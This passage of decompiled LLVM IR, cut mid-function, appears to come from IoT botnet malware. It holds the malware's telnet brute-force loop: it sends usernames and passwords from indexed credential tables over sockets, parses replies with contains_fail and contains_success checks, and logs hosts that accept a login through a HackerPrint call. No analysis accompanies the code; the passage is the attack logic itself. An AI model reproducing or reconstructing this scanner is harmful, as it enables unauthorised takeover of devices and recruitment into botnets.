  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e04c, i32* %r3.global-to-local, align 4
  %v2_e90c = load i32, i32* %v1_e050, align 4
  store i32 %v2_e90c, i32* %r3.global-to-local, align 4
  %v1_e910 = add i32 %v2_e90c, 6
  store i32 %v1_e910, i32* @r4, align 4
  %v2_e918 = call i32 @time(i32* null)
  store i32 %v2_e918, i32* %r3.global-to-local, align 4
  %v0_e920 = load i32, i32* @r4, align 4
  %v3_e920 = icmp ult i32 %v0_e920, %v2_e918
  br i1 %v3_e920, label %dec_label_pc_e928, label %dec_label_pc_f5bc

dec_label_pc_e928:                                ; preds = %dec_label_pc_e8ec
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e940 = load i32, i32* %v1_e5ac, align 4
  store i32 %v2_e940, i32* %r3.global-to-local, align 4
  %v3_e948 = call i32 @sclose(i32 %v2_e940, i32 %v3_df4c, i32 %v3_e03c)
  %v2_e968 = add i32 %v2_e048, 8
  %v3_e970 = inttoptr i32 %v2_e968 to i8*
  store i8 0, i8* %v3_e970, align 4
  store i32 %v2_e968, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_e998 = add i32 %v2_e048, 9
  %v4_e998 = inttoptr i32 %v3_e998 to i8*
  store i8 1, i8* %v4_e998, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_e9a0:                                ; preds = %dec_label_pc_e094
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v1_e9b8 = inttoptr i32 %v2_e048 to i32*
  %v2_e9b8 = load i32, i32* %v1_e9b8, align 4
  store i32 %v2_e9b8, i32* %ip.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_e9d8 = add i32 %v2_e044, %v2_e820
  store i32 %v2_e9d8, i32* %r3.global-to-local, align 4
  %v1_e9dc = inttoptr i32 %v2_e9d8 to i32*
  %v2_e9dc = load i32, i32* %v1_e9dc, align 4
  store i32 %v2_e9dc, i32* %r2.global-to-local, align 4
  %v1_e9e4 = load i32, i32* @sp, align 4
  %v2_e9e4 = inttoptr i32 %v1_e9e4 to i32*
  store i32 ptrtoint (i32* @global_var_2e0e4 to i32), i32* %v2_e9e4, align 4
  %v0_e9e8 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_e9f4 = inttoptr i32 %v2_e9dc to i8*
  %v5_e9f4 = call i32 @read_until_response(i32 %v0_e9e8, i32 10, i8* %v4_e9f4, i32 1024)
  %v2_e9fc = icmp eq i32 %v5_e9f4, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_e9fc, label %dec_label_pc_ea94, label %dec_label_pc_ea04

dec_label_pc_ea04:                                ; preds = %dec_label_pc_e9a0
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e9d8, i32* %r3.global-to-local, align 4
  %v2_ea24 = load i32, i32* %v1_e9dc, align 4
  store i32 %v2_ea24, i32* %r3.global-to-local, align 4
  %v3_ea2c = call i32 @contains_fail(i32 %v2_ea24, i32 %v3_df4c, i32 %v3_e03c)
  %v2_ea34 = icmp eq i32 %v3_ea2c, 0
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_ea84 = add i32 %v2_e048, 8
  store i32 %v2_ea84, i32* %r2.global-to-local, align 4
  br i1 %v2_ea34, label %dec_label_pc_ea68, label %dec_label_pc_ea3c

dec_label_pc_ea3c:                                ; preds = %dec_label_pc_ea04
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ea60 = inttoptr i32 %v2_ea84 to i8*
  store i8 0, i8* %v3_ea60, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_ea68:                                ; preds = %dec_label_pc_ea04
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_ea8c = inttoptr i32 %v2_ea84 to i8*
  store i8 3, i8* %v3_ea8c, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_ea94:                                ; preds = %dec_label_pc_e9a0
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e04c, i32* %r3.global-to-local, align 4
  %v2_eab4 = load i32, i32* %v1_e050, align 4
  store i32 %v2_eab4, i32* %r3.global-to-local, align 4
  %v1_eab8 = add i32 %v2_eab4, 6
  store i32 %v1_eab8, i32* @r4, align 4
  %v2_eac0 = call i32 @time(i32* null)
  store i32 %v2_eac0, i32* %r3.global-to-local, align 4
  %v0_eac8 = load i32, i32* @r4, align 4
  %v3_eac8 = icmp ult i32 %v0_eac8, %v2_eac0
  br i1 %v3_eac8, label %dec_label_pc_ead0, label %dec_label_pc_f5bc

dec_label_pc_ead0:                                ; preds = %dec_label_pc_ea94
  %v2_eaec = add i32 %v2_e048, 8
  %v3_eaf4 = inttoptr i32 %v2_eaec to i8*
  store i8 0, i8* %v3_eaf4, align 4
  store i32 %v2_eaec, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_eb1c = add i32 %v2_e048, 9
  %v4_eb1c = inttoptr i32 %v3_eb1c to i8*
  store i8 1, i8* %v4_eb1c, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_eb24:                                ; preds = %dec_label_pc_e094
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v1_eb3c = inttoptr i32 %v2_e048 to i32*
  %v2_eb3c = load i32, i32* %v1_eb3c, align 4
  store i32 %v2_eb3c, i32* @r4, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_eb5c = add i32 %v2_e048, 8
  store i32 %v2_eb5c, i32* %r3.global-to-local, align 4
  %v1_eb60 = add i32 %v2_e048, 10
  %v2_eb60 = inttoptr i32 %v1_eb60 to i8*
  %v3_eb60 = load i8, i8* %v2_eb60, align 2
  %v4_eb60 = zext i8 %v3_eb60 to i32
  store i32 %v4_eb60, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32), i32* %r3.global-to-local, align 4
  %v4_eb6c = mul nuw nsw i32 %v4_eb60, 4
  %v5_eb6c = add i32 %v4_eb6c, ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32)
  %v6_eb6c = inttoptr i32 %v5_eb6c to i32*
  %v7_eb6c = load i32, i32* %v6_eb6c, align 4
  store i32 %v7_eb6c, i32* @r5, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_eb5c, i32* %r3.global-to-local, align 4
  %v3_eb90 = load i8, i8* %v2_eb60, align 2
  %v4_eb90 = zext i8 %v3_eb90 to i32
  store i32 %v4_eb90, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32), i32* %r3.global-to-local, align 4
  %v4_eb9c = mul nuw nsw i32 %v4_eb90, 4
  %v5_eb9c = add i32 %v4_eb9c, ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32)
  %v6_eb9c = inttoptr i32 %v5_eb9c to i32*
  %v7_eb9c = load i32, i32* %v6_eb9c, align 4
  store i32 %v7_eb9c, i32* %r3.global-to-local, align 4
  %v1_eba0 = inttoptr i32 %v7_eb9c to i8*
  %v3_eba4 = call i32 @strlen(i8* %v1_eba0)
  %v0_ebac = load i32, i32* @r4, align 4
  %v0_ebb0 = load i32, i32* @r5, align 4
  store i32 %v3_eba4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ebbc = inttoptr i32 %v0_ebb0 to i32*
  %v5_ebbc = call i32 @__libc_send(i32 %v0_ebac, i32* %v4_ebbc, i32 %v3_eba4, i32 16384)
  %v1_ebc4 = icmp slt i32 %v5_ebbc, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_ebc4, label %dec_label_pc_ebcc, label %dec_label_pc_ec20

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_eb24
  %v3_ebf0 = inttoptr i32 %v2_eb5c to i8*
  store i8 0, i8* %v3_ebf0, align 4
  store i32 %v2_eb5c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ec18 = add i32 %v2_e048, 9
  %v4_ec18 = inttoptr i32 %v3_ec18 to i8*
  store i8 1, i8* %v4_ec18, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_ec20:                                ; preds = %dec_label_pc_eb24
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_ec38 = load i32, i32* %v1_eb3c, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ec4c = call i32 @__libc_send(i32 %v2_ec38, i32* bitcast ([3 x i8]* @global_var_20560.523 to i32*), i32 2, i32 16384)
  %v1_ec54 = icmp slt i32 %v6_ec4c, 0
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  store i32 %v2_eb5c, i32* %r2.global-to-local, align 4
  br i1 %v1_ec54, label %dec_label_pc_ec5c, label %dec_label_pc_ecb0

dec_label_pc_ec5c:                                ; preds = %dec_label_pc_ec20
  %v3_ec80 = inttoptr i32 %v2_eb5c to i8*
  store i8 0, i8* %v3_ec80, align 4
  store i32 %v2_eb5c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_eca8 = add i32 %v2_e048, 9
  %v4_eca8 = inttoptr i32 %v3_eca8 to i8*
  store i8 1, i8* %v4_eca8, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_ecb0:                                ; preds = %dec_label_pc_ec20
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_ecd4 = inttoptr i32 %v2_eb5c to i8*
  store i8 4, i8* %v3_ecd4, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_ecdc:                                ; preds = %dec_label_pc_e094
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v1_ecf4 = inttoptr i32 %v2_e048 to i32*
  %v2_ecf4 = load i32, i32* %v1_ecf4, align 4
  store i32 %v2_ecf4, i32* %ip.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_ed14 = add i32 %v2_e044, %v2_e820
  store i32 %v2_ed14, i32* %r3.global-to-local, align 4
  %v1_ed18 = inttoptr i32 %v2_ed14 to i32*
  %v2_ed18 = load i32, i32* %v1_ed18, align 4
  store i32 %v2_ed18, i32* %r2.global-to-local, align 4
  %v1_ed20 = load i32, i32* @sp, align 4
  %v2_ed20 = inttoptr i32 %v1_ed20 to i32*
  store i32 ptrtoint (i32* @global_var_2e0e4 to i32), i32* %v2_ed20, align 4
  %v0_ed24 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_ed30 = inttoptr i32 %v2_ed18 to i8*
  %v5_ed30 = call i32 @read_until_response(i32 %v0_ed24, i32 10, i8* %v4_ed30, i32 1024)
  %v2_ed38 = icmp eq i32 %v5_ed30, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_ed38, label %dec_label_pc_edd0, label %dec_label_pc_ed40

dec_label_pc_ed40:                                ; preds = %dec_label_pc_ecdc
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_ed14, i32* %r3.global-to-local, align 4
  %v2_ed60 = load i32, i32* %v1_ed18, align 4
  store i32 %v2_ed60, i32* %r3.global-to-local, align 4
  %v3_ed68 = call i32 @contains_fail(i32 %v2_ed60, i32 %v3_df4c, i32 %v3_e03c)
  %v2_ed70 = icmp eq i32 %v3_ed68, 0
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_edc0 = add i32 %v2_e048, 8
  store i32 %v2_edc0, i32* %r2.global-to-local, align 4
  br i1 %v2_ed70, label %dec_label_pc_eda4, label %dec_label_pc_ed78

dec_label_pc_ed78:                                ; preds = %dec_label_pc_ed40
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ed9c = inttoptr i32 %v2_edc0 to i8*
  store i8 0, i8* %v3_ed9c, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_eda4:                                ; preds = %dec_label_pc_ed40
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_edc8 = inttoptr i32 %v2_edc0 to i8*
  store i8 5, i8* %v3_edc8, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_edd0:                                ; preds = %dec_label_pc_ecdc
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e04c, i32* %r3.global-to-local, align 4
  %v2_edf0 = load i32, i32* %v1_e050, align 4
  store i32 %v2_edf0, i32* %r3.global-to-local, align 4
  %v1_edf4 = add i32 %v2_edf0, 6
  store i32 %v1_edf4, i32* @r4, align 4
  %v2_edfc = call i32 @time(i32* null)
  store i32 %v2_edfc, i32* %r3.global-to-local, align 4
  %v0_ee04 = load i32, i32* @r4, align 4
  %v3_ee04 = icmp ult i32 %v0_ee04, %v2_edfc
  br i1 %v3_ee04, label %dec_label_pc_ee0c, label %dec_label_pc_f5bc

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_edd0
  %v2_ee28 = add i32 %v2_e048, 8
  %v3_ee30 = inttoptr i32 %v2_ee28 to i8*
  store i8 0, i8* %v3_ee30, align 4
  store i32 %v2_ee28, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ee58 = add i32 %v2_e048, 9
  %v4_ee58 = inttoptr i32 %v3_ee58 to i8*
  store i8 1, i8* %v4_ee58, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_ee60:                                ; preds = %dec_label_pc_e094
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v1_ee78 = inttoptr i32 %v2_e048 to i32*
  %v2_ee78 = load i32, i32* %v1_ee78, align 4
  store i32 %v2_ee78, i32* @r4, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_ee98 = add i32 %v2_e048, 8
  store i32 %v2_ee98, i32* %r3.global-to-local, align 4
  %v1_ee9c = add i32 %v2_e048, 11
  %v2_ee9c = inttoptr i32 %v1_ee9c to i8*
  %v3_ee9c = load i8, i8* %v2_ee9c, align 1
  %v4_ee9c = zext i8 %v3_ee9c to i32
  store i32 %v4_ee9c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32), i32* %r3.global-to-local, align 4
  %v4_eea8 = mul nuw nsw i32 %v4_ee9c, 4
  %v5_eea8 = add i32 %v4_eea8, ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32)
  %v6_eea8 = inttoptr i32 %v5_eea8 to i32*
  %v7_eea8 = load i32, i32* %v6_eea8, align 4
  store i32 %v7_eea8, i32* @r5, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_ee98, i32* %r3.global-to-local, align 4
  %v3_eecc = load i8, i8* %v2_ee9c, align 1
  %v4_eecc = zext i8 %v3_eecc to i32
  store i32 %v4_eecc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32), i32* %r3.global-to-local, align 4
  %v4_eed8 = mul nuw nsw i32 %v4_eecc, 4
  %v5_eed8 = add i32 %v4_eed8, ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32)
  %v6_eed8 = inttoptr i32 %v5_eed8 to i32*
  %v7_eed8 = load i32, i32* %v6_eed8, align 4
  store i32 %v7_eed8, i32* %r3.global-to-local, align 4
  %v1_eedc = inttoptr i32 %v7_eed8 to i8*
  %v3_eee0 = call i32 @strlen(i8* %v1_eedc)
  %v0_eee8 = load i32, i32* @r4, align 4
  %v0_eeec = load i32, i32* @r5, align 4
  store i32 %v3_eee0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_eef8 = inttoptr i32 %v0_eeec to i32*
  %v5_eef8 = call i32 @__libc_send(i32 %v0_eee8, i32* %v4_eef8, i32 %v3_eee0, i32 16384)
  %v1_ef00 = icmp slt i32 %v5_eef8, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_ef00, label %dec_label_pc_ef08, label %dec_label_pc_ef5c

dec_label_pc_ef08:                                ; preds = %dec_label_pc_ee60
  %v3_ef2c = inttoptr i32 %v2_ee98 to i8*
  store i8 0, i8* %v3_ef2c, align 4
  store i32 %v2_ee98, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ef54 = add i32 %v2_e048, 9
  %v4_ef54 = inttoptr i32 %v3_ef54 to i8*
  store i8 1, i8* %v4_ef54, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ee60
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_ef74 = load i32, i32* %v1_ee78, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ef88 = call i32 @__libc_send(i32 %v2_ef74, i32* bitcast ([3 x i8]* @global_var_20560.523 to i32*), i32 2, i32 16384)
  %v1_ef90 = icmp slt i32 %v6_ef88, 0
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  store i32 %v2_ee98, i32* %r2.global-to-local, align 4
  br i1 %v1_ef90, label %dec_label_pc_ef98, label %dec_label_pc_efec

dec_label_pc_ef98:                                ; preds = %dec_label_pc_ef5c
  %v3_efbc = inttoptr i32 %v2_ee98 to i8*
  store i8 0, i8* %v3_efbc, align 4
  store i32 %v2_ee98, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_efe4 = add i32 %v2_e048, 9
  %v4_efe4 = inttoptr i32 %v3_efe4 to i8*
  store i8 1, i8* %v4_efe4, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_efec:                                ; preds = %dec_label_pc_ef5c
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_f010 = inttoptr i32 %v2_ee98 to i8*
  store i8 6, i8* %v3_f010, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_f018:                                ; preds = %dec_label_pc_e094
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v1_f030 = inttoptr i32 %v2_e048 to i32*
  %v2_f030 = load i32, i32* %v1_f030, align 4
  store i32 %v2_f030, i32* %ip.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_f050 = add i32 %v2_e044, %v2_e820
  store i32 %v2_f050, i32* %r3.global-to-local, align 4
  %v1_f054 = inttoptr i32 %v2_f050 to i32*
  %v2_f054 = load i32, i32* %v1_f054, align 4
  store i32 %v2_f054, i32* %r2.global-to-local, align 4
  %v1_f05c = load i32, i32* @sp, align 4
  %v2_f05c = inttoptr i32 %v1_f05c to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_2e12c.527 to i32), i32* %v2_f05c, align 4
  %v0_f060 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_f06c = inttoptr i32 %v2_f054 to i8*
  %v5_f06c = call i32 @read_until_response(i32 %v0_f060, i32 10, i8* %v4_f06c, i32 1024)
  store i32 %v5_f06c, i32* %r3.global-to-local, align 4
  %v2_f074 = icmp eq i32 %v5_f06c, 0
  br i1 %v2_f074, label %dec_label_pc_f370, label %dec_label_pc_f07c

dec_label_pc_f07c:                                ; preds = %dec_label_pc_f018
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f084 = call i32 @time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f098 = load i32, i32* @r4, align 4
  %v2_f0a4 = mul i32 %v0_f098, 28
  %v2_f0ac = add i32 %v2_f388, %v2_f0a4
  %v2_f0b0 = inttoptr i32 %v2_f0ac to i32*
  store i32 %v2_f084, i32* %v2_f0b0, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_f0d0 = add i32 %v2_e048, 24
  store i32 %v2_f0d0, i32* %r3.global-to-local, align 4
  %v1_f0d4 = inttoptr i32 %v2_f0d0 to i32*
  %v2_f0d4 = load i32, i32* %v1_f0d4, align 4
  store i32 %v2_f0d4, i32* %r3.global-to-local, align 4
  %v3_f0dc = call i32 @contains_fail(i32 %v2_f0d4, i32 %v3_df4c, i32 %v3_e03c)
  %v2_f0e4 = icmp eq i32 %v3_f0dc, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_f0e4, label %dec_label_pc_f118, label %dec_label_pc_f0ec

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f07c
  %v2_f108 = add i32 %v2_e048, 8
  store i32 %v2_f108, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f110 = inttoptr i32 %v2_f108 to i8*
  store i8 0, i8* %v3_f110, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_f118:                                ; preds = %dec_label_pc_f07c
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_f0d0, i32* %r3.global-to-local, align 4
  %v2_f138 = load i32, i32* %v1_f0d4, align 4
  store i32 %v2_f138, i32* %r3.global-to-local, align 4
  %v3_f140 = call i32 @contains_success(i32 %v2_f138, i32 %v3_df4c, i32 %v3_e03c)
  %v2_f148 = icmp eq i32 %v3_f140, 0
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_f338 = add i32 %v2_e048, 8
  br i1 %v2_f148, label %dec_label_pc_f31c, label %dec_label_pc_f150

dec_label_pc_f150:                                ; preds = %dec_label_pc_f118
  store i32 %v2_f338, i32* %r3.global-to-local, align 4
  %v1_f170 = add i32 %v2_e048, 9
  %v2_f170 = inttoptr i32 %v1_f170 to i8*
  %v3_f170 = load i8, i8* %v2_f170, align 1
  %v4_f170 = zext i8 %v3_f170 to i32
  store i32 %v4_f170, i32* %r3.global-to-local, align 4
  %v7_f174 = icmp eq i8 %v3_f170, 2
  br i1 %v7_f174, label %dec_label_pc_f17c, label %dec_label_pc_f1a8

dec_label_pc_f17c:                                ; preds = %dec_label_pc_f150
  store i32 %v2_f338, i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_f1a0 = inttoptr i32 %v2_f338 to i8*
  store i8 7, i8* %v3_f1a0, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f150
  %v2_f1ac = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_f1ac, i32* @r4, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v3_f1cc = call i32 @get_telstate_host(i32 %v2_e048, i32 %v3_df4c, i32 %v3_e03c)
  store i32 %v3_f1cc, i32* %ip.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_f338, i32* %r3.global-to-local, align 4
  %v1_f1f4 = add i32 %v2_e048, 10
  %v2_f1f4 = inttoptr i32 %v1_f1f4 to i8*
  %v3_f1f4 = load i8, i8* %v2_f1f4, align 2
  %v4_f1f4 = zext i8 %v3_f1f4 to i32
  store i32 %v4_f1f4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32), i32* %r3.global-to-local, align 4
  %v4_f200 = mul nuw nsw i32 %v4_f1f4, 4
  %v5_f200 = add i32 %v4_f200, ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32)
  %v6_f200 = inttoptr i32 %v5_f200 to i32*
  %v7_f200 = load i32, i32* %v6_f200, align 4
  store i32 %v7_f200, i32* %lr.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_f338, i32* %r3.global-to-local, align 4
  %v1_f224 = add i32 %v2_e048, 11
  %v2_f224 = inttoptr i32 %v1_f224 to i8*
  %v3_f224 = load i8, i8* %v2_f224, align 1
  %v4_f224 = zext i8 %v3_f224 to i32
  store i32 %v4_f224, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32), i32* %r3.global-to-local, align 4
  %v4_f230 = mul nuw nsw i32 %v4_f224, 4
  %v5_f230 = add i32 %v4_f230, ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32)
  %v6_f230 = inttoptr i32 %v5_f230 to i32*
  %v7_f230 = load i32, i32* %v6_f230, align 4
  %v1_f234 = load i32, i32* @sp, align 4
  %v2_f234 = inttoptr i32 %v1_f234 to i32*
  store i32 %v7_f230, i32* %v2_f234, align 4
  %v0_f238 = load i32, i32* @r4, align 4
  %v0_f240 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f240, i32* @r2, align 4
  %v0_f244 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_f244, i32* %r3.global-to-local, align 4
  %v2_f248 = call i32 @HackerPrint(i32 %v0_f238, i32 ptrtoint (i32* @global_var_20564.530 to i32))
  %v2_f250 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_f250, i32* @r4, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v3_f270 = call i32 @get_telstate_host(i32 %v2_e048, i32 %v3_df4c, i32 %v3_e03c)
  store i32 %v3_f270, i32* %ip.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_f338, i32* %r3.global-to-local, align 4
  %v3_f298 = load i8, i8* %v2_f1f4, align 2
  %v4_f298 = zext i8 %v3_f298 to i32
  store i32 %v4_f298, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32), i32* %r3.global-to-local, align 4
  %v4_f2a4 = mul nuw nsw i32 %v4_f298, 4
  %v5_f2a4 = add i32 %v4_f2a4, ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32)
  %v6_f2a4 = inttoptr i32 %v5_f2a4 to i32*
  %v7_f2a4 = load i32, i32* %v6_f2a4, align 4
  store i32 %v7_f2a4, i32* %lr.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_f338, i32* %r3.global-to-local, align 4
  %v3_f2c8 = load i8, i8* %v2_f224, align 1
  %v4_f2c8 = zext i8 %v3_f2c8 to i32
  store i32 %v4_f2c8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32), i32* %r3.global-to-local, align 4
  %v4_f2d4 = mul nuw nsw i32 %v4_f2c8, 4
  %v5_f2d4 = add i32 %v4_f2d4, ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32)
  %v6_f2d4 = inttoptr i32 %v5_f2d4 to i32*
  %v7_f2d4 = load i32, i32* %v6_f2d4, align 4
  %v1_f2d8 = load i32, i32* @sp, align 4
  %v2_f2d8 = inttoptr i32 %v1_f2d8 to i32*
  store i32 %v7_f2d4, i32* %v2_f2d8, align 4
  %v0_f2dc = load i32, i32* @r4, align 4
  %v0_f2e4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f2e4, i32* @r2, align 4
  %v0_f2e8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_f2e8, i32* %r3.global-to-local, align 4
  %v3_f2ec = call i32 @HackerPrint(i32 %v0_f2dc, i32 ptrtoint ([16 x i8]* @global_var_205d0.532 to i32))
  store i32 %v2_f338, i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_f314 = inttoptr i32 %v2_f338 to i8*
  store i8 7, i8* %v3_f314, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_f31c:                                ; preds = %dec_label_pc_f118
  %v3_f340 = inttoptr i32 %v2_f338 to i8*
  store i8 0, i8* %v3_f340, align 4
  store i32 %v2_f338, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f368 = add i32 %v2_e048, 9
  %v4_f368 = inttoptr i32 %v3_f368 to i8*
  store i8 1, i8* %v4_f368, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_f370:                                ; preds = %dec_label_pc_f018
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_f38c = add i32 %v2_e044, %v2_f388
  store i32 %v2_f38c, i32* %r3.global-to-local, align 4
  %v1_f390 = inttoptr i32 %v2_f38c to i32*
  %v2_f390 = load i32, i32* %v1_f390, align 4
  store i32 %v2_f390, i32* %r3.global-to-local, align 4
  %v1_f394 = add i32 %v2_f390, 7
  store i32 %v1_f394, i32* @r4, align 4
  %v2_f39c = call i32 @time(i32* null)
  store i32 %v2_f39c, i32* %r3.global-to-local, align 4
  %v0_f3a4 = load i32, i32* @r4, align 4
  %v3_f3a4 = icmp ult i32 %v0_f3a4, %v2_f39c
  br i1 %v3_f3a4, label %dec_label_pc_f3ac, label %dec_label_pc_f5bc

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f370
  %v2_f3c8 = add i32 %v2_e048, 8
  %v3_f3d0 = inttoptr i32 %v2_f3c8 to i8*
  store i8 0, i8* %v3_f3d0, align 4
  store i32 %v2_f3c8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f3f8 = add i32 %v2_e048, 9
